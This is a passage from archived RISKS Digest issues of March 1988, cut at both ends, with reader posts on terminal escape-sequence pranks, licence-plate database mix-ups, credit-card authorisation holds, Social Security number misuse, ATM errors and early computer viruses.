particular modes in the terminal (such as "local only" instead of "transmit")
and many terminals also have a form of "answer back" which allows a sequence to
be automatically dumped by the terminal.  I suspect the latter was used to
accomplish the file permission changes and process killings.

&gt;    1). Why are the features in the terminal in the first place? I can
&gt;        only assume that Wyse put them in as security features. A hacker
&gt;        accesses your system you lock out the terminal.

They are there as features to programmers.  I can see where it might
be nice to be able to lock up the terminal so that a user cannot do
anything while my program does something delicate.

&gt;    2). Has anyone had similar experiences? I've only been reading this
&gt;        group for a year while we've know of the possiblities of the Wyse
&gt;        for at least two. At first it was limited to changing a friend's
&gt;        screen to inverse mode. We never envisaged it being used so
&gt;        destructively.

Sure.  It happens here all the time.  Usually it starts out with students
finding out that it's possible to send control sequences to others' terminals
and then doing research to find out just how nasty they can be.  Enclosing them
in mail and dumping them directly are two common methods of doing this.
Turning off write permission to your terminal will stop direct writing in a
UNIX environment, and it's quite simple to write a utility that looks for
escape sequences in mail files before actually displaying the file.

About the only way to prevent this sort of thing is to disallow communications
between users or to screen communication for obvious control sequences.
Screening comes with risk, but the risk is very low.  Alternatively, make it
known to the users that such activities are frowned upon and severely punished;
this proved extremely effective in our case.
                                                        jim frost

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Virus file requests
</A>
</H3>
<address>
&lt;<A HREF="mailto:Robert_Slade@mtsg.ubc.ca">
Robert_Slade@mtsg.ubc.ca
</A>&gt;
</address>
<i>
Wed, 16 Mar 88 08:13:06 PST
</i><PRE>

My panic (compounded by a messaging system that is in the throes of who-knows-
what just now) having subsided somewhat, the only workable solution to the
flood of requests in the immediate future is going to be the mails. For those
who need the stuff *now*, (and much of it is only what has appeared here
already) send a PC formatted 5 1/4 floppy with a self addressed stamped
*mailer* to:

     Rob Slade    3118 Baird Road    North Vancouver, B. C.   CANADA    V7K 2G6

Americans need not worry about Canadian postage, I can send the stuff to be
mailed in Bellingham.  For those with other than standard MS-DOS machines, I
have Media Master (an early version) and so can read other formats such as
Kaypro.  Sorry, I can't give a full list.  If your disk is not readable by the
program, I'll reformat as MS-DOS and you can try at your end.
 
     Remember, the file is in excess of 200K.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
"NOPLATE" and "NONE"
</A>
</H3>
<address>
Eric Norman 
&lt;<A HREF="mailto:ejnorman%dogie@unix2.macc.wisc.edu">
ejnorman%dogie@unix2.macc.wisc.edu
</A>&gt;
</address>
<i>
Sun, 13 Mar 88 22:29:23 CST
</i><PRE>

&gt;     But, if you really want to confuse the computer matching programs, you
&gt;     might opt for something like 1OI0O01, which on California plates would
&gt;     be quite hard to read accurately as it flies by.  PGN]

Hah! it's actually happened.  Quite a while ago I had a personal license
plate of "0 HERO" (that's zero-hero; it means something to road ralliers).
I had to fight off the University parking folks charge that I had failed
to register my plate with them.

Eric Norman &lt;ejnorman@unix2.macc.wisc.edu&gt;

</PRE>
<HR><H3><A NAME="subj9.2">
NOPLATE vs NO PLATES (Re: <A HREF="/Risks/6.41.html">RISKS-6.41</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:uw-beaver!ssc-vax!ssc-bee!lee@ames.arc.nasa.gov">
uw-beaver!ssc-vax!ssc-bee!lee@ames.arc.nasa.gov
</A>&gt;
</address>
<i>
Mon, 14 Mar 88 17:11:41 pst
</i><PRE>

Regarding the NOPLATE references, I keep this article pinned up on my bulletin
board.  Helps remind me of what Mr. Spencer calls "name space pollution".

Seattle Post-Intelligencer, 14 October 1987, pg. C1, 
abstracted without permission (obviously a re-print from other sources)

  ... When a policeman pulled Robert Barbour over while he was driving his
  1970 Datsun a few months ago, a computer check of his license plate got the
  officer excited.

[So, we have Mr. X's name and vehicle now.  Details on how it came to be,
similar to Niels Jensen's note.  Additional juicy anecdotes... ]

  "At first, I called them up and told them to look on the car in the citation.
  Then I started writing some individual letters as the totals ran into the
  dozens.  But by the time I started getting hundreds a month, I had a form
  letter."

  ... his postage bills surpassed $300 ...

  He liked it because the plate provoked some dialogue with officers
  that rivalled Abbott and Costello's "Who's On First?" routine.

  At first, Barbour was embarrassed to put the plates on his Datsun
  and was cited for -- you guessed it.

  He finally bolted them on and went to a Los Angeles court to get that ticket
  excused.  An inspector duly noted that he had his plates on, and Barbour
  took the notation to a clerk.  The clerk took one look at the paper, which
  noted that "NOPLATE" indeed was bolted to the car.

 Clerk:  You need to take care of that first before I can sign you off.

  Barbour:  The officer has inspected it, and the plates are on the car.

  Clerk:  According to this, there are no plates on the car.

  Barbour:  There are plates and they say 'NOPLATE'.

  Clerk:  But if your vehicle has no plate, you need to put them on before I
  can sign off this ticket.

  Barbour:  I have put on the plates!

  Clerk:  Not accourding to this.  It says 'No plates'.
 
  Barbour:  It says 'NOPLATE'! Not 'no plates'! Because that's what the plates
  say.

[ Other strange stories, ending with ... ]

  While the mistaken-identity parking tickets have slowed to a trickle,
  Barbour still dreams of new challenges.

  Can he get a vanity plate that reads "NONE".

--- end ---

Strikingly, this article reveals "blind reliance of technology by skilled
workers", "name space pollution", and "challenging the myth of ... computer
infallibility", all hot RISKS topics.

     [Perhaps they'll cool off.  This is getting silly.  PGN]

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
High-Tech Trucking (Rick Sidwell, RISKS 6.42)
</A>
</H3>
<address>
&lt;<A HREF="mailto:Michael Wagner +49 228 303 245">
Michael Wagner +49 228 303 245
</A>&gt;
</address>
<i>
Tue, 15 Mar 88 15:01 CET
</i><PRE>
Cc: Rick Sidwell &lt;sidwell@commerce.UCI.EDU&gt;

&gt;   " The 'black box' ... automatically records drive time, speed,
&gt;   distance traveled as well as other important functions that
&gt;   reveal how a driver handles his rig.

There may be problems with this scheme, but I'm not sure that invasion of
privacy is one of them.  The idea that a recorder in the vehicle should report
on vehicle handling, and that the driver can potentially be reprimanded or
punished for transgressions so recorded, is well established in airplanes and
somewhat also for trains.  Notice that, for the specific case of speeding, the
entry/exit time stamps on a toll ticket could also be evidence of speeding.
Likewise, properly synchronized clocks and 2 unambiguous pictures, or in fact
radar.  The difference is only whether the observing device is inside or
outside the vehicle.  I don't see a privacy issue in that difference (there is
a tampering issue, however!).

There is, of course, a civil liberties problem with stopping a vehicle for no
good reason and then hunting for transgressions to '(post)-justify' stopping
the vehicle.  Is that perhaps what was meant?  The 'black box' then is not the
threat, any more than the toll ticket was.  It is improper exercise of power.

Michael

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Architecting Telephone Systems
</A>
</H3>
<address>
Graham Wilkinson 
&lt;<A HREF="mailto:mcvax!gec-mi-at.co.uk!gpw@uunet.UU.NET">
mcvax!gec-mi-at.co.uk!gpw@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed, 16 Mar 88 07:59:31 GMT
</i><PRE>
Organization: Computing Lab, University of Kent at Canterbury, UK.

In the Times (London, 15 March 1988) today there was an article about an
architect in south London who for the past month has been troubled with
strange noises in his telephone at all times of day (and night).

It started one Sunday morning when his phone clicked, then started
making pinging noises. Since that time this has continued at the rate
of several calls a day. After initial puzzlement he realised that it was
a computer which had called up his number by mistake.

He went to British Telecom, who offered to intercept his calls for a
fortnight, but after this time the calls continued. They said they were
not able to trace the source of the call, as this could only be done by
special request of the police, i.e., they could but they wouldn't.

The only solution offered was to give him a new number, at a cost of 21 pounds.
He queried this, complaining that it wasn't his fault, but their reply was 'It
isn't our fault either'! When pointed out that they were the ones offering the
service, silence reigned. Obviously he wants to keep his old number, as all his
friends know it - so why can't BT trace this call - and why doesn't the
computer realise that nothing is coming back up the line it is transmitting
down? (Apart from a couple of times the poor fellow whistled back to it -
causing it to drop an octave).

The Times concluded by saying that this wasn't an unknown occurance, and
that, given the unhelpfulness of BT, it would be pretty bad luck if this
were to happen to you!

</PRE>
<A NAME="subj12"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj12.1">
 Risks of using computers for Architectural Engineering
</A>
</H3>
<address>
Steven Koinm 
&lt;<A HREF="mailto:goog%a.cs.okstate.edu@RELAY.CS.NET">
goog%a.cs.okstate.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Tue, 15 Mar 88 15:03:11 CST
</i><PRE>

     I am presently working on a paper on the risks of using computers
for Architectural Engineering.  If anyone can suggest some good articles
or books or just drop me a note with their opinion or suggestions on 
this topic, I would be extremely grateful.

     And in addition, could you send me an opinionated reply to this statement: 
"Because computers are inherently error-prone, we should not use them for
Architectural Engineering."

Thanks for your time.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.44.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.46.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-81</DOCNO>
<DOCOLDNO>IA012-000129-B044-47</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.46.html 128.240.150.127 19970217020153 text/html 32120
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:00:18 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 46</TITLE>
<LINK REL="Prev" HREF="/Risks/6.45.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.47.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.45.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.47.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 46</H1>
<H2>  Friday 18 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Incorrect computer data entries hide bridge dangers 
</A>
<DD>
<A HREF="#subj1.1">
Jon Mauney
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Held at Mouse Point 
</A>
<DD>
<A HREF="#subj2.1">
Bruce N. Baker
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Federal Archive Integrity 
</A>
<DD>
<A HREF="#subj3.1">
Fred Baube
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Credit-limit handling found overly restrictive 
</A>
<DD>
<A HREF="#subj4.1">
Wayne H. Badger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  First-hand problems with Social security numbers 
</A>
<DD>
<A HREF="#subj5.1">
anonymous
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  RISKS in Bell lawsuit 
</A>
<DD>
<A HREF="#subj6.1">
Scott E. Preece
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Teller Machines 
</A>
<DD>
<A HREF="#subj7.1">
Jon Mauney
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Program prejudice; ATMs; self-test; unknowns; viruses 
</A>
<DD>
<A HREF="#subj8.1">
Larry Nathanson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Viruses go commercial 
</A>
<DD>
<A HREF="#subj9.1">
Norman S. Soley
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  The trouble with "Experts" 
</A>
<DD>
<A HREF="#subj10.1">
Ewan Tempero
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Thoughts on viruses and trusted bulletin boards 
</A>
<DD>
<A HREF="#subj11.1">
Richard Wiggins
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Incorrect computer data entries hide bridge dangers
</A>
</H3>
<address>
Jon Mauney
&lt;<A HREF="mailto:mauney@cscadm.ncsu.edu ">
mauney@cscadm.ncsu.edu 
</A>&gt;
</address>
<i>
Thu, 17 Mar 88 12:30:30 est
</i><PRE>

The Sunday March 13, 1988 edition of the Raleigh, NC, News and Observer
contains a story on accidents on the Northeast Cape Fear River Bridge in
Wilmington NC.  It seems that the steel grid deck of the drawbridge is slippery
when wet, causing cars to skid into oncoming traffic.  The highway department
investigated at the request of the Attorney General's office, which was paying
settlements to accident victims.  When the highway department pulled records on
the Cape Fear Memorial Bridge for comparison, it found that most of the
accidents attributed to Memorial had in fact occurred on Northeast.  Quoting
the newspaper, which was quoting the assistant state traffic engineer:

   "When we got into actually pulling the accident reports for Cape Fear
   Memorial Bridge -- the actual hard copies -- we saw that some of those
   did not belong on Cape Fear Memorial Bridge,"  Mallard said.  "In fact,
   they belonged on Northeast Cape Fear.  That's when we realized we had
   the coding problem."

   The locations of most accidents had been coded wrong, sometimes by the
   investigating officers and sometimes by employees of the Division of
   Motor Vehicles.  Accidents on the bridge were recorded as happening on
   U.S 17, U.S. 74, or U.S. 421, or some other highway, instead of the
   proper route, U.S. 117.  [All four highways pass through Wilmington]

On checking the data, they found that the accident rate was not 11 in 3 years
but 28 in 3 years.  The article goes on to say that the state made skid tests
on three steel grid deck bridges, including the two Cape Fear bridges
mentioned, in 1982.  The Northeast Cape Fear bridge performed the *worst* in
the test, but nothing was done, because of the low accident record.  State
officials were not sure that the skid test was applicable to steel decks.  The
bridge was only one year old in 1982.  Most of the miscoded accidents occurred
since then, and have increased as the steel and worn smoother.

The article does not make clear what kind of code was improperly entered
in the accident reports, nor what kind of technology was used to store
and retrieve the data.  The reference to "actual hardcopy" gives a strong
hint.  The dangers of "coding" data, and of ignoring test results,
will be familar to RISKS readers.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: Held at Mouse Point (RISKS 6.31)
</A>
</H3>
<address>
Bruce N. Baker 
&lt;<A HREF="mailto:BNBaker@KL.SRI.COM">
BNBaker@KL.SRI.COM
</A>&gt;
</address>
<i>
Thu 17 Mar 88 10:45:17-PST
</i><PRE>

The individual referred to in RISKS 6.31 under the heading, "If he had
another brain it would be lonely" department, may have the last laugh after
all.  As you may recall, the training instructor told the students "to point
and click with the mouse."  One individual complained that nothing was 
happening.  The instructor discovered that the student was pointing with his
forefinger at the correct spot on the screen while clicking the mouse.

Well, support has arrived just in time via the Contaq PointScreen.  Unlike
traditional touchscreens, the PointScreen uses ultrasonic sensors mounted on
the monitor frame to respond to a pointed finger that does not touch the 
screen.  The $695 PointScreen adapts to monitors with screens 9 to 26 inches
across.  The system connects to the computer through a serial port and includes
an interface card and software.  (*High Technology Business*, Feb 1988, p. 10)

The point for RISKS is that acts that sound dumb represent both risks and new
product opportunities.  For example, talking to the mailbox (a la the famous 
Candid Camera item) may be the next last laugh.  It would sure beat talking 
to my clerk.  I recently went to the local post office window and asked if an
urgent letter could be processed directly there for a local address with a post
office box about 10' to 12' away from the clerk.  I was told there was no way
that local mail could be handled locally.  All mail must go through the 
regional processing center in San Francisco.  He suggested I drive to the 
company location, about 4 miles distant from the post office box sitting
there tantalizingly close behind him.

Here's one risk of automation that I was dumb about.  I used an extra blank
window envelope supplied by a credit card company in its previous billing to
me to post a check to a *different* creditor, not noticing the little bars
running along the bottom edge of the envelope.  Of course, the check first
went to the address indicated by the little bar code, a clerk there drew an
arrow, pointing to the window address and re-posted it, then it came back to
me, and I finally taped over the little bars to enable it to be processed to
the address appearing in the window.  Elapsed time: 10 days, resulting in a
finance charge.

Bruce N. Baker, SRI International

        [If the bill in the second case had been from the Electric Company,
        and the address had been a local P.O. Box, as in the first case, 
        you could have tied a brick to the bill and tossed it into through 
        the P.O. Box window.  Then you could write a book about such
        experiences, entitled The Finance Charge of the Light Brick Aid.  
        But you might have to do it BEHIND little bars, with NO windows.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Federal Archive Integrity
</A>
</H3>
<address>
Fred Baube 
&lt;<A HREF="mailto:fbaube@note.nsf.gov">
fbaube@note.nsf.gov
</A>&gt;
</address>
<i>
Thu, 17 Mar 88 15:24:37 -0500
</i><PRE>

sco!sethk@ucscc.UCSC.EDU writes:
&gt; Archive's Black Hole
&gt; [..] Don Wilson, the Federal Archivist [said] before a House
&gt; subcommittee last month .. that "data held on computers is
&gt; frequently altered or updated" - shades of the deeds done by
&gt; Oliver North and Fawn Hall - and that much material never
&gt; reaches the National Archives ..

If this doesn't sound like setting the stage for *1984*, I don't know what does.

How about supplying the Archives with lots of write-once ultra-bulk-storage
devices, and secure communications links to federal agencies for (say) daily
downloading.  Could this minimize excuses for non-compliance with mandatory
and timely (i.e. before unauthorized editing) archiving?  Maybe also set up
a fast review system within the judiciary for timely resolution of disputes
about just what information *does* fall under this scheme?  (There would be
disputes about working papers, drafts, notes, etc.)

Regarding a role for the judiciary, "national security" shouldn't be a
stumbling block.  The US already has a secret federal court here in DC [or
is it NYC?] *now*, for electronic surveillance cases.  (See
_The_Puzzle_Palace_, Bamford)

One could debug proposed schemes with Gedanken Experiments involving Ollie's
PROFS notes ..

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Credit-limit handling found overly restrictive
</A>
</H3>
<address>
Wayne H. Badger
&lt;<A HREF="mailto:badger%fang@xenurus.Gould.COM ">
badger%fang@xenurus.Gould.COM 
</A>&gt;
</address>
<i>
Thu, 17 Mar 88 10:37:06 CST
</i><PRE>

I just had an unsettling and embarrassing experience with Mastercard/Visa.
I had a Mastercard charge denied, when I supposedly had more than sufficient
credit.  After some querying, I found out what the problem was.

I had just made a large (for me) purchase with Mastercard that was more
than half of my credit limit.  The company immediately sent a computerized
authorization request to Mastercard, which was accepted.  This purchase
was done over the phone.  However, some of the articles I wanted to
purchase were not in stock, so the company did not actually bill for the
entire amount.  As a result, I now had an authorization *and* a bill
credited against my limit, which pushed me over the limit.  Any further
attempts to charge anything were denied, even though I was well under my
limit for actual bills.

The problem is that companies send authorizations for different amounts
than they actually bill.  For example, a restaurant will send an
authorization for the amount of the bill, plus "a couple of dollars" to
cover the tip.  The tip that you write on the Mastercard slip will hardly
ever match the authorization.  You have just doubled the amount credited
against your credit limit.

I called my Mastercard bank and they informed me that authorizations
remain in effect for 10 days if not removed.  Authorizations can be
removed in two ways:

	1.  If a bill comes in for the exact amount of the authorization
	    on the same day, the authorization will be replaced with
	    the bill.
	2.  A company can remove the authorization by arrangements through
	    their bank in what is apparently a difficult procedure.

Apparently, Mastercard does not cross check the company when comparing
authorizations and bills.  This seems rather silly.  The Mastercard
operator could not tell what company had made any of the authorizations
in my account.  The Mastercard operator also refused to remove any
authorizations.

It seems to me that whoever designed Mastercard's computerized
authorization didn't think that anyone would ever send a bill for a
different amount than the related authorization.  Unfortunately, this
appears to be the rule, rather than the exception.

What this all means is that, in the worst case, a credit limit for a bank
card is less that half of the stated limit, so I asked Mastercard to double
my credit limit.  They declined.  Maybe it's time to just go get the Amex
card.  Sigh.

BTW, this is the second Mastercard that I have tried.  Both had the same
problem.  Has anyone seen this problem before?  Is it just me?

Wayne H. Badger, badger@xenurus.gould.com  ...!ihnp4!uiucuxc!ccvaxa!badger

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
First-hand problems with Social security numbers
</A>
</H3>
<address>
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
16 Mar 88 14:41:56 EST
</i><PRE>

   [The following message is from a contributor who has requested anonymity.]

I came to this country in Fall 79 on an F-1 visa.  I was a full-time student
from then to mid '85.  In the beginning of '85 I received a job offer and tried
to get a 6 month practical-training permit so that I could start on my job.

I did not hear from the INS for a few months.  In the meantime I really scared
because this is a routine procedure and should not take more than a few weeks.
Finally I called the INS after 4 months.  I was informed that the INS was going
to start deportation procedures against me.  They claimed that I had been
working illegally for the last five years. (It is illegal to work on an F-1
visa.)

I was stunned.  I had clear proof that I had never been anything but a
full-time student all the time and I told them so.  They said they would check
into it.

Next day I called them back and I told them the following.

1. They claimed that I had entered the US from Miami.  This was
   wrong.  I had entered from New York.  The date of entry was
   also wrong by 2 weeks.

2. They claimed I was a Columbian National who had obtained a visa
   in Venezuela.  This was wrong.

3. They claimed that I had worked in Florida and Texas.  I had
   letters from my advisors that I had been at school the whole time.

They called me in to their office and checked the above from my Passport.  Then
they said they would get back to me.  I never heard from them again about the
deportation proceedings.  In a month I received my work permit and I joined
work.  I only lost a few months wages.

Last year I requested my Social Security statement.  Sure enough there are
payments into my account from '81 - '83. I have not heard from the IRS about
this and I hope I do not.  I don't know whether to worry about this or not.
The only thing I have going for me is that my company attorneys are excellent.

It is scary to know that somebody out there is using my name and social
security number and there is nothing I can do about it.  Why me?

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
RISKS in Bell lawsuit
</A>
</H3>
<address>
Scott E. Preece
&lt;<A HREF="mailto:preece%fang@xenurus.Gould.COM ">
preece%fang@xenurus.Gould.COM 
</A>&gt;
</address>
<i>
Thu, 17 Mar 88 08:56:26 CST
</i><PRE>

  From: Alan Wexelblat &lt;wex%SW.MCC.COM@MCC.COM&gt;
  &gt; 	"[The settlement] stems from Bell's computerized accounting
  &gt; 	system which government investigators claim shifted costs
  &gt; 	among the contracts..."
  &gt; 
  &gt; [note how the computer is blamed, not the programmer, nor the people who
  &gt; used it nor the people who ordered it programmed/used in that way!]

Funny, my reading skills are pretty adequate and I read that sentence as
blaming the acounting system, not the computer.  An accounting system
includes a lot of components, some of them human.  I think it's fair to
assume that even a newspaper reporter knows that pointing at a program
is really pointing at the author.

scott preece, gould/csd - urbana, uucp:	ihnp4!uiucdcs!ccvaxa!preece

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Teller Machines
</A>
</H3>
<address>
Jon Mauney
&lt;<A HREF="mailto:mauney@cscadm.ncsu.edu ">
mauney@cscadm.ncsu.edu 
</A>&gt;
</address>
<i>
Thu, 17 Mar 88 12:31:34 est
</i><PRE>

RE: teller machine errors.

When I was starting graduate school in 1977-78, Wisconsin banks
were installing the TYME teller machine network.  State banking
laws effectively required all teller machines to be part of a
single statewide network.  The system (or at least my bank) had
a lot of teething problems.  It was not uncommon for a withdrawal
request to be rejected because of timeout on the acknowledgement/
authorization from the host computer.  A retry would usually succeed,
resulting in a double-posting of the debit.  Usually double postings
would be caught and corrected when the books were balanced, and I
got to be quite accustomed to having lots of extraneous debits
and credits on my statement. I also learned how to find the back room
of the bank where the harried man with the printouts of all TYME
transactions could correct any problems that the bank had overlooked.

One month, however, they got carried away, and manually re-applied an
incorrect debit that had been manually corrected the previous month,
causing me to bounce several checks.  Apparently electronic networks
are not the only systems that suffer from echo and delayed packets.

It may be silly of me, but while I love to use teller machines for
withdrawals,  I *never* entrust my deposits to them.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Program prejudice; ATMs; self-test; unknowns; viruses
</A>
</H3>
<address>
Larry Nathanson
&lt;<A HREF="mailto:bucsb!lan@csl.sri.com ">
bucsb!lan@csl.sri.com 
</A>&gt;
</address>
<i>
17 Mar 88 04:36:41 GMT
</i><PRE>
Organization: Boston Univ Comp. Sci.

  On the writing of a program that simulated the admissions selections, to a
probability of better than 90 percent: This was done, with the prejudice
intended to mimic human decisions.  What if one wrote a program to devise an
algorithm that would match an acceptance pattern, and then examined the
algorithm for prejudice.  For example, you would give this program the
application of each student and it would work out an algorithm whose output
of acceptances and rejections would come out better than 90 percent.  The
algorithm could then be put through extreme scrutiny (much more than just
the raw data alone would be subject to), and the school/person/company who
was being simulated might then be held accountable.  This is extremely scary
considering someone might simulate you (given your reactions to several
situations) and find out a lot about your inner psyche.  Your answers to a
few meaningless questions on a job interview could be interpreted for drug
use, integrity of character, and watching Saturday Morning Cartoons.  This
had already been attempted (to an extent) in a program called "Mind Prober"
(available for small PC's.)  One answers 70-100 yes/no questions about a
person, and it spits out a psychoanalytic report, from a psych101 textbook.

  On video-cameras in ATM's, I don't think that the camera does any pattern
recognition.  I think it just stores a few seconds of each transaction, with
a time stamp, in case a dispute comes up later.  A third hand anecdote: A
college sophomore, who though he could beat the system, placed a check (for
his credit limit) in an envelope, and deposited it, with cash back (it
immediately gives back an amount of cash, up to the person's credit limit),
to a nearly empty account and walked away.  The trick: there was nothing in
the envelope, and he had the cash in his hand.  The next time he went to the
machine it told him to see the manager.  The manager told him they were wise
to his game, and that they were removing the balance of his account, and he
still owed them the rest.  When the cheat told the manager, he had no
knowledge of the deposit, and had nothing to do with it, the manager showed
him the cameras in the machines, and told him that if he made them go
through the film to find his picture, they would involve the authorities.
(Though it might have been a bluff: back to the risk of threats of using
technology...)  He surrendered his ATM card, and eventually paid back the
money.  Ways around this are left up to your imagination.

  On self-tests:  Note that the purpose of a self-test is to determine whether
or not the device running the test is operating correctly. A situation similar
to this:  There are two men before you.  One is a truth-teller and one is a
liar.  You ask both, 'are you a truth-teller' and both reply yes.  This is not
surprising.  Then why should one expect a meaningful warning from a
malfunctioning machine.  If the machine is working, it will return that it is
working.  If the machine is not working, it may well return that it is working:
it is a broken machine (as in a liar).  If you get an error message, it means
that the liar decided to tell the truth.  Lucky break... not one I'd like to
rely on.  So... just because your calculator (or anything else) says that it is
working, remember that the output 'I am working' may well be a part of the
malfunction.  What one needs is not a self-test but an 'other-test'.  Let's
hope that it is working.

  On the UNKNOWN front, a story goes about the new police clerk who was given a
few reports, and told to check each one in the computer for warrants.  All
turned up negative, except for one, LNU, FNU (apparently a rather evil oriental
man) turned up with the most outstanding report imaginable.  When she brought
it back, her superviser cracked up, hysterically laughing, as did anyone she
showed it to.  As it turns out, FNU LNU was the ``acceptable input form'' for
First Name Unknown, Last Name Unknown.

  Finally, on viruses: Who says that someone has to sneak a virus onto your
system.  You can do it yourself.  Many people type in programs from magazines.
The changing of one byte, in an object code listing, could change a read to a
write, and screw up a lot of people before the magazine could get a bulletin
out to its subscribers.  Talk about the ultimate virus: It convinces you to
nuke your own disk drive.

Larry Nathanson, Boston University.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Viruses go commercial
</A>
</H3>
<address>
"Norman S. Soley" 
&lt;<A HREF="mailto:soley%ontenv.uucp@RELAY.CS.NET">
soley%ontenv.uucp@RELAY.CS.NET
</A>&gt;
</address>
<i>
17 Mar 88 17:17:04 GMT
</i><PRE>
Organization: Ontario Ministry of the Environment, Toronto

It continues to get curiouser and curiouser;

&gt;From the "Toronto Star" March 16,1988:

  First Virus found in commercial software

  A computer virus has infected a commercially available personal computer
  product for what is believed to be the first time, calling into question the
  safety and reliability of software sold in retail stores.

  [This] has led one software company to change the way it manufactures
  software and will likely force other companies to do the same.

[... the concept of a virus is explained, we know this all too well...]

  Although the virus discovered last week in FreeHand, a Macintosh design
  program from Aldus Corp. of Seatlle, was a harmless "message of peace," a
  more destructive virus could have wiped out expensive computer data or years
